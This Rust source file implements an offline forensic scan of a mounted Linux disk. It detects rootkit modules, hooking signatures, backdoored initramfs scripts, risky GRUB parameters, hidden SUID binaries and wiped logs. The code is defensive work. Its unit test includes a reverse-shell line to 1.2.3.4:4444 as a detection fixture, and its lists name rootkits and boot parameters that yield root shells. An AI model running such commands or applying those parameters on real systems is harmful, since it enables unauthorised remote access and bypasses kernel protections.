//! Offline forensic scan of a mounted disk. The disk is attacker-controlled input:
//! every read goes through `Root` (symlinks re-rooted, size caps, regular files only),
//! and initramfs images are parsed in memory instead of being extracted as root.

use crate::config::ScanConfig;
use crate::modules::{antiforensics, files, persistence};
use crate::pkg::{self, Ownership};
use crate::report::{progress as prog, send, Finding, ScanEvent, Sender, Severity};
use crate::util::{self, Root};
use std::os::unix::fs::MetadataExt;
use std::time::{Duration, Instant};

const MODULE: &str = "OFFLINE";

fn progress(tx: &Sender, msg: &str) {
    prog(tx, MODULE, msg)
}

const ROOTKIT_NAMES: [&str; 16] = [
    "diamorphine",
    "reptile",
    "bdvl",
    "jynx",
    "suterusu",
    "knark",
    "adore",
    "enyelkm",
    "azazel",
    "brootus",
    "nurupo",
    "kovid",
    "beurk",
    "vlany",
    "singularity",
    "khugepagefs",
];

const HOOK_SIGS: [&[u8]; 14] = [
    b"sys_call_table",
    b"kallsyms_lookup_name",
    b"register_kprobe",
    b"register_ftrace_function",
    b"ftrace_set_filter_ip",
    b"__x64_sys_getdents",
    b"__x64_sys_kill",
    b"tcp4_seq_show",
    b"filldir",
    b"hide_pid",
    b"hide_port",
    b"hidden_pids",
    b"module_hide",
    b"rootkit",
];

pub fn hook_score(data: &[u8]) -> Vec<String> {
    HOOK_SIGS.iter().filter(|s| data.windows(s.len()).any(|w| w == **s)).map(|s| String::from_utf8_lossy(s).into_owned()).collect()
}

/// Decompress gzip/zstd/xz/lz4/bzip2 data with a trusted system tool (bounded output).
pub fn decompress(data: &[u8], cap: usize) -> Option<Vec<u8>> {
    let (cands, args): (&[&str], &[&str]) = if data.starts_with(&[0x1f, 0x8b]) {
        (&["/usr/bin/gzip", "/bin/gzip"], &["-dc"])
    } else if data.starts_with(&[0x28, 0xb5, 0x2f, 0xfd]) {
        (&["/usr/bin/zstd"], &["-dcq"])
    } else if data.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0]) {
        (&["/usr/bin/xz", "/bin/xz"], &["-dc"])
    } else if data.starts_with(&[0x02, 0x21, 0x4c, 0x18]) || data.starts_with(&[0x04, 0x22, 0x4d, 0x18]) {
        (&["/usr/bin/lz4"], &["-dc"])
    } else if data.starts_with(b"BZh") {
        (&["/usr/bin/bzip2", "/bin/bzip2"], &["-dc"])
    } else if data.starts_with(&[0x5d, 0x00, 0x00]) {
        (&["/usr/bin/xz", "/bin/xz"], &["--format=lzma", "-dc"])
    } else {
        return None;
    };
    let out = util::run_cmd(cands, args, Duration::from_secs(120), cap, Some(data.to_vec()))?;
    if out.stdout.is_empty() {
        None
    } else {
        Some(out.stdout)
    }
}

// ───────────────────────── in-memory cpio (initramfs) ─────────────────────────

#[allow(dead_code)]
#[derive(Debug)]
pub struct CpioEntry {
    pub name: String,
    pub mode: u32,
    pub data: Vec<u8>,
}

fn hex8(b: &[u8]) -> Option<usize> {
    usize::from_str_radix(std::str::from_utf8(b).ok()?, 16).ok()
}

/// Parse one newc/crc cpio archive at `off`. Returns entries and the offset after TRAILER.
pub fn parse_cpio(data: &[u8], mut off: usize, out: &mut Vec<CpioEntry>, file_cap: usize) -> Option<usize> {
    loop {
        if off + 110 > data.len() || !(data[off..].starts_with(b"070701") || data[off..].starts_with(b"070702")) {
            return None;
        }
        let h = &data[off..off + 110];
        let mode = hex8(&h[14..22])? as u32;
        let filesize = hex8(&h[54..62])?;
        let namesize = hex8(&h[94..102])?;
        let name_start = off + 110;
        let name_end = name_start.checked_add(namesize)?;
        if name_end > data.len() {
            return None;
        }
        let name = String::from_utf8_lossy(&data[name_start..name_end.saturating_sub(1)]).into_owned();
        let data_start = (name_end + 3) & !3;
        let data_end = data_start.checked_add(filesize)?;
        if data_end > data.len() {
            return None;
        }
        off = (data_end + 3) & !3;
        if name == "TRAILER!!!" {
            return Some(off);
        }
        let is_reg = mode & 0o170000 == 0o100000;
        out.push(CpioEntry { name, mode, data: if is_reg && filesize <= file_cap { data[data_start..data_end].to_vec() } else { Vec::new() } });
    }
}

/// Parse a whole initramfs: leading uncompressed archives (microcode), then compressed ones.
pub fn parse_initramfs(data: &[u8], depth: usize, out: &mut Vec<CpioEntry>) {
    let mut off = 0usize;
    while off < data.len() {
        while off < data.len() && data[off] == 0 {
            off += 1;
        }
        if off >= data.len() {
            break;
        }
        if data[off..].starts_with(b"07070") {
            match parse_cpio(data, off, out, 64 * 1024 * 1024) {
                Some(next) => off = next,
                None => break,
            }
        } else {
            if depth < 2 {
                if let Some(dec) = decompress(&data[off..], 1024 * 1024 * 1024) {
                    parse_initramfs(&dec, depth + 1, out);
                }
            }
            break;
        }
    }
}

// ───────────────────────── checks ─────────────────────────

fn kernel_module_scan(root: &Root, cfg: &ScanConfig, tx: &Sender) {
    progress(tx, "Scanning kernel modules on disk (unpackaged modules get a content scan)...");
    let mut scanned = 0;
    let mut suspicious = 0;
    for kver in root.read_dir("/lib/modules") {
        let base = match root.resolve(&format!("/lib/modules/{}", kver)) {
            Some(b) => b,
            None => continue,
        };
        util::walk(&base, 12, false, 500_000, |e| {
            if !e.meta.file_type().is_file() {
                return;
            }
            let host = e.path.to_string_lossy().into_owned();
            let name = e.path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            if !(name.ends_with(".ko") || name.ends_with(".ko.xz") || name.ends_with(".ko.zst") || name.ends_with(".ko.gz")) {
                return;
            }
            scanned += 1;
            let inner = root.inner(&e.path);
            let lower = name.to_lowercase();
            if let Some(rk) = ROOTKIT_NAMES.iter().find(|r| lower.contains(*r)) {
                suspicious += 1;
                send(
                    tx,
                    Finding::new(Severity::Danger, MODULE, "Rootkit Module", &format!("Known rootkit module '{}' on disk: {}", rk, host))
                        .subject(&inner)
                        .artifact(&host),
                );
                return;
            }
            let owned = pkg::owner(root, &inner);
            if owned == Ownership::Owned && !cfg.full {
                return;
            }
            let raw = match util::read_capped(&e.path, 256 * 1024 * 1024) {
                Some(r) => r,
                None => return,
            };
            let data = if name.ends_with(".ko") { raw } else { decompress(&raw, 512 * 1024 * 1024).unwrap_or_default() };
            let hits = hook_score(&data);
            if hits.len() >= 3 {
                suspicious += 1;
                send(
                    tx,
                    Finding::new(
                        if owned == Ownership::NotOwned { Severity::Danger } else { Severity::Warning },
                        MODULE,
                        "Suspicious Module",
                        &format!("Kernel module with {} hooking indicators: {}", hits.len(), host),
                    )
                    .with_detail(&format!("Indicators: {}\nPackage-owned: {:?}", hits.join(", "), owned))
                    .subject(&inner)
                    .artifact(&host),
                );
            } else if owned == Ownership::NotOwned
                && (inner.contains("/extra/") || inner.contains("/updates/") || inner.contains("/misc/") || inner.matches('/').count() <= 4)
            {
                send(tx, Finding::new(Severity::Info, MODULE, "Kernel Modules", &format!("Unpackaged kernel module (DKMS/manual): {}", inner)).subject(&inner));
            }
        });
    }
    if suspicious == 0 {
        send(tx, Finding::new(Severity::Safe, MODULE, "Kernel Modules", &format!("{} kernel modules checked — no rootkit indicators", scanned)).subject("ko"));
    }
}

fn initramfs_scan(root: &Root, tx: &Sender) {
    progress(tx, "Parsing initramfs images in memory (no extraction to disk)...");
    let images: Vec<String> = root.read_dir("/boot").into_iter().filter(|n| n.starts_with("initrd") || n.starts_with("initramfs")).collect();
    if images.is_empty() {
        send(tx, Finding::new(Severity::Info, MODULE, "Initramfs", "No initramfs/initrd found in /boot").subject("initrd-none"));
        return;
    }
    for img in &images {
        let path = format!("/boot/{}", img);
        let data = match root.read_capped(&path, 512 * 1024 * 1024) {
            Some(d) => d,
            None => continue,
        };
        let mut entries = Vec::new();
        parse_initramfs(&data, 0, &mut entries);
        let mut hits = 0;
        for e in &entries {
            let file = e.name.rsplit('/').next().unwrap_or(&e.name).to_lowercase();
            if let Some(rk) = ROOTKIT_NAMES.iter().find(|r| file.contains(*r)) {
                hits += 1;
                send(
                    tx,
                    Finding::new(Severity::Danger, MODULE, "Initramfs Rootkit", &format!("'{}' embedded in {}: {}", rk, path, e.name))
                        .subject(&format!("{}:{}", path, e.name)),
                );
                continue;
            }
            if e.data.is_empty() {
                continue;
            }
            if file.ends_with(".ko") || file.ends_with(".ko.zst") || file.ends_with(".ko.xz") {
                let data = if file.ends_with(".ko") { e.data.clone() } else { decompress(&e.data, 256 * 1024 * 1024).unwrap_or_default() };
                let h = hook_score(&data);
                if h.len() >= 3 {
                    hits += 1;
                    send(
                        tx,
                        Finding::new(
                            Severity::Warning,
                            MODULE,
                            "Initramfs Hook",
                            &format!("Module in {} has {} hooking indicators: {}", path, h.len(), e.name),
                        )
                        .with_detail(&h.join(", "))
                        .subject(&format!("{}:{}", path, e.name)),
                    );
                }
            } else if e.data.starts_with(b"#!") || file.ends_with(".sh") || e.name == "init" {
                let text = String::from_utf8_lossy(&e.data);
                for line in text.lines() {
                    if persistence::danger_set().is_match(line) {
                        hits += 1;
                        send(
                            tx,
                            Finding::new(
                                Severity::Danger,
                                MODULE,
                                "Initramfs Script",
                                &format!("Backdoor-like command in initramfs script {} ({})", e.name, path),
                            )
                            .with_detail(&util::truncate(line.trim(), 300))
                            .subject(&format!("{}:{}", path, e.name)),
                        );
                        break;
                    }
                }
            }
            // early userspace preload: /etc/ld.so.preload inside the initramfs
            if e.name.ends_with("etc/ld.so.preload") && !e.data.iter().all(|b| b.is_ascii_whitespace()) {
                hits += 1;
                send(
                    tx,
                    Finding::new(Severity::Danger, MODULE, "Initramfs Rootkit", &format!("{} contains etc/ld.so.preload", path))
                        .with_detail(&String::from_utf8_lossy(&e.data))
                        .subject(&format!("{}:preload", path)),
                );
            }
        }
        send(
            tx,
            Finding::new(
                if entries.is_empty() { Severity::Warning } else { Severity::Info },
                MODULE,
                "Initramfs",
                &format!("{}: {} entries parsed, {} indicator(s)", path, entries.len(), hits),
            )
            .with_detail(if entries.is_empty() { "Could not parse — unknown compression or decompressor missing" } else { "" })
            .subject(&format!("initrd:{}", path)),
        );
    }
}

fn bootloader_scan(root: &Root, tx: &Sender) {
    progress(tx, "Checking bootloader configuration and binaries...");
    let cfgs = ["/boot/grub/grub.cfg", "/boot/grub2/grub.cfg", "/boot/efi/EFI/fedora/grub.cfg", "/etc/default/grub"];
    let bad_params = [
        "init=/bin/sh",
        "init=/bin/bash",
        "rdinit=/bin/sh",
        "rd.break",
        "systemd.debug-shell",
        "debug_shell",
        "lockdown=none",
        "module.sig_enforce=0",
        "selinux=0",
        "apparmor=0",
    ];
    let known_mods = [
        "ext2",
        "ext4",
        "xfs",
        "btrfs",
        "fat",
        "ntfs",
        "part_gpt",
        "part_msdos",
        "normal",
        "linux",
        "loopback",
        "gzio",
        "lvm",
        "raid",
        "search",
        "configfile",
        "terminal",
        "serial",
        "video",
        "gfxterm",
        "gfxmenu",
        "png",
        "jpeg",
        "font",
        "echo",
        "ls",
        "cat",
        "test",
        "true",
        "sleep",
        "reboot",
        "halt",
        "iso9660",
        "udf",
        "all_video",
        "boot",
        "chain",
        "cryptodisk",
        "luks",
        "luks2",
        "gcry_rijndael",
        "gcry_sha256",
        "gcry_sha512",
        "mdraid09",
        "mdraid1x",
        "diskfilter",
        "loadenv",
        "keystatus",
        "regexp",
        "probe",
        "password_pbkdf2",
        "lzopio",
        "search_fs_uuid",
        "search_fs_file",
        "search_label",
        "biosdisk",
        "multiboot",
        "multiboot2",
        "play",
        "trig",
        "lspci",
        "usb",
        "uhci",
        "ohci",
        "ehci",
        "usbms",
        "xhci",
        "efi_gop",
        "efi_uga",
        "gfxterm_background",
        "tpm",
        "zfs",
        "zstd",
        "blscfg",
        "increment",
        "bli",
        "f2fs",
        "squash4",
        "exfat",
        "hfsplus",
        "minicmd",
        "vbe",
        "vga",
        "video_bochs",
        "video_cirrus",
    ];
    for c in cfgs {
        let content = match root.read_string(c, 16 * 1024 * 1024) {
            Some(x) => x,
            None => continue,
        };
        for line in content.lines() {
            let t = line.trim();
            if t.starts_with('#') {
                continue;
            }
            let is_kernel_line = t.starts_with("linux") || t.starts_with("kernel") || t.starts_with("GRUB_CMDLINE_LINUX");
            if is_kernel_line {
                let tokens: Vec<&str> = t.split(|ch: char| ch.is_whitespace() || ch == '"').collect();
                for p in &bad_params {
                    if tokens.contains(p) {
                        send(
                            tx,
                            Finding::new(Severity::Warning, MODULE, "GRUB Config", &format!("Boot parameter '{}' in {}", p, root.display(c)))
                                .with_detail(&format!("{}\nGives a root shell at boot or disables kernel protections", util::truncate(t, 200)))
                                .subject(&format!("{}:{}", c, p)),
                        );
                    }
                }
            }
            if let Some(rest) = t.strip_prefix("insmod ") {
                let m = rest.trim();
                if !known_mods.contains(&m) {
                    send(
                        tx,
                        Finding::new(Severity::Warning, MODULE, "GRUB Module", &format!("Unusual GRUB module '{}' loaded in {}", m, root.display(c)))
                            .subject(&format!("{}:{}", c, m)),
                    );
                }
            }
        }
    }
    for dir in ["/boot/grub", "/boot/grub2", "/boot/efi/EFI"] {
        if let Some(base) = root.resolve(dir) {
            util::walk(&base, 4, false, 50_000, |e| {
                let n = e.path.to_string_lossy();
                let boot_file = n.ends_with(".efi") || n.ends_with(".img") || n.ends_with(".mod");
                // FAT EFI partitions have no real permissions — only judge /boot/grub*
                if e.meta.file_type().is_file() && boot_file && e.meta.mode() & 0o022 != 0 && !n.contains("/boot/efi") {
                    send(tx, Finding::new(Severity::Danger, MODULE, "Bootloader", &format!("Bootloader file is group/world writable: {}", n)).subject(&n));
                }
            });
        }
    }
}

fn hidden_files_scan(root: &Root, tx: &Sender) {
    progress(tx, "Scanning temp/home dirs on disk for binaries and SUID files...");
    for dir in ["/tmp", "/var/tmp", "/dev/shm", "/run", "/home", "/root", "/var/www", "/opt"] {
        let base = match root.resolve(dir) {
            Some(b) => b,
            None => continue,
        };
        let temp = matches!(dir, "/tmp" | "/var/tmp" | "/dev/shm" | "/run");
        util::walk(&base, 6, false, 1_000_000, |e| {
            if !e.meta.file_type().is_file() {
                return;
            }
            let inner = root.inner(&e.path);
            let host = e.path.to_string_lossy().into_owned();
            let mode = e.meta.mode();
            if mode & 0o4000 != 0 && e.meta.uid() == 0 {
                send(
                    tx,
                    Finding::new(Severity::Danger, MODULE, "Hidden SUID", &format!("Root SUID binary outside system paths: {}", inner))
                        .with_detail("Privilege-escalation backdoor")
                        .subject(&inner)
                        .artifact(&host),
                );
                return;
            }
            let hidden = util::has_hidden_component(&inner);
            if temp || (hidden && !inner.starts_with("/home/") && !inner.starts_with("/root/")) {
                if let Some(head) = util::read_head(&e.path, 4) {
                    if util::is_elf(&head) || util::is_pe(&head) {
                        send(
                            tx,
                            Finding::new(Severity::Danger, MODULE, "Hidden Binary", &format!("Executable in {}: {}", dir, inner))
                                .with_detail(&format!("Size {} bytes — visible offline even if a rootkit hid it live", e.meta.len()))
                                .subject(&inner)
                                .artifact(&host),
                        );
                    }
                }
            }
        });
    }
}

fn log_evidence_scan(root: &Root, tx: &Sender) {
    progress(tx, "Checking logs on disk for wiping...");
    let mut ok_uids = util::uids_of(root, &["root", "syslog", "_apt", "systemd-journal"]);
    ok_uids.push(0);
    let ok_gids = util::gids_of(root, &["adm", "systemd-journal", "utmp", "syslog", "root"]);
    for log in [
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/kern.log",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/audit/audit.log",
        "/var/log/wtmp",
        "/var/log/lastlog",
    ] {
        let meta = match root.lstat(log) {
            Some(m) => m,
            None => continue,
        };
        if meta.file_type().is_symlink() {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "Log Wiped", &format!("{} is a symlink to {}", log, root.readlink(log).unwrap_or_default()))
                    .subject(&format!("link:{}", log)),
            );
            continue;
        }
        if meta.len() == 0 {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "Log Wiped", &format!("Critical log is empty on disk: {}", log)).subject(&format!("empty:{}", log)),
            );
        }
        if !ok_uids.contains(&meta.uid()) && !ok_gids.contains(&meta.gid()) {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Log Owner", &format!("{} owned by uid {} gid {}", log, meta.uid(), meta.gid()))
                    .subject(&format!("owner:{}", log)),
            );
        }
    }
    if root.lstat("/var/log/journal").map(|m| m.is_dir()).unwrap_or(false) && root.read_dir("/var/log/journal").is_empty() {
        send(tx, Finding::new(Severity::Warning, MODULE, "Log Wiped", "/var/log/journal exists but is empty").subject("journal-empty"));
    }
}

pub fn scan(target: &str, cfg: &ScanConfig, tx: Sender) {
    let start = Instant::now();
    let _ = tx.send(ScanEvent::ModuleStart(MODULE.to_string()));
    let root = Root::new(target);
    if !root.exists("/etc") || !root.exists("/usr") {
        send(
            &tx,
            Finding::new(Severity::Danger, MODULE, "Target", &format!("'{}' doesn't look like a Linux root filesystem", target))
                .with_detail("Missing /etc or /usr — is the disk mounted correctly?")
                .subject("target"),
        );
        let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
        return;
    }
    let pm = pkg::pm_of(&root);
    send(&tx, Finding::new(Severity::Info, MODULE, "Target", &format!("Offline target {} (package manager: {})", root.base.display(), pm)).subject("target"));

    kernel_module_scan(&root, cfg, &tx);
    progress(&tx, "Verifying packaged files against checksums...");
    if let Some(db) = &cfg.hashdb {
        match pkg::verify_hashdb(&root, db) {
            Ok(r) => files::report_verify_as(&tx, r, "hashdb", MODULE),
            Err(e) => send(&tx, Finding::new(Severity::Warning, MODULE, "Binary Integrity", &e).subject("hashdb")),
        }
    }
    let r = pkg::verify(&root, cfg.full, if cfg.full { Duration::from_secs(1800) } else { Duration::from_secs(300) });
    files::report_verify_as(&tx, r, &pm.to_string(), MODULE);
    progress(&tx, "Running the persistence sweep against the disk...");
    persistence::scan_root(&root, &tx);
    antiforensics::pam_checks(&root, &tx, MODULE);
    initramfs_scan(&root, &tx);
    bootloader_scan(&root, &tx);
    hidden_files_scan(&root, &tx);
    log_evidence_scan(&root, &tx);
    let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cpio_entry(name: &str, data: &[u8], mode: u32) -> Vec<u8> {
        let mut v = format!(
            "070701{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}",
            1,
            mode,
            0,
            0,
            1,
            0,
            data.len(),
            0,
            0,
            0,
            0,
            name.len() + 1,
            0
        )
        .into_bytes();
        v.extend_from_slice(name.as_bytes());
        v.push(0);
        while v.len() % 4 != 0 {
            v.push(0);
        }
        v.extend_from_slice(data);
        while v.len() % 4 != 0 {
            v.push(0);
        }
        v
    }

    #[test]
    fn cpio_newc_parsing() {
        let mut a = cpio_entry("kernel/x86/microcode/GenuineIntel.bin", b"ucode", 0o100644);
        a.extend(cpio_entry("TRAILER!!!", b"", 0));
        a.extend(vec![0u8; 512]); // padding between archives
        a.extend(cpio_entry("usr/lib/modules/6.1/extra/diamorphine.ko", b"\x7fELF...sys_call_table", 0o100644));
        a.extend(cpio_entry("scripts/init-bottom/x", b"#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", 0o100755));
        a.extend(cpio_entry("TRAILER!!!", b"", 0));
        let mut out = Vec::new();
        parse_initramfs(&a, 0, &mut out);
        assert_eq!(out.len(), 3);
        assert_eq!(out[0].data, b"ucode");
        assert!(out[1].name.ends_with("diamorphine.ko"));
        assert!(persistence::danger_set().is_match(String::from_utf8_lossy(&out[2].data).lines().nth(1).unwrap()));
    }

    #[test]
    fn truncated_cpio_does_not_panic() {
        let mut a = cpio_entry("file", b"0123456789", 0o100644);
        a.truncate(a.len() - 6);
        let mut out = Vec::new();
        parse_initramfs(&a, 0, &mut out);
        assert!(out.is_empty());
        let mut huge = b"070701".to_vec();
        huge.extend(b"FFFFFFFF".repeat(13));
        parse_initramfs(&huge, 0, &mut out);
    }

    #[test]
    fn hook_indicators() {
        let ko = b"...kallsyms_lookup_name...sys_call_table...__x64_sys_getdents64...";
        assert_eq!(hook_score(ko).len(), 3);
    }
}
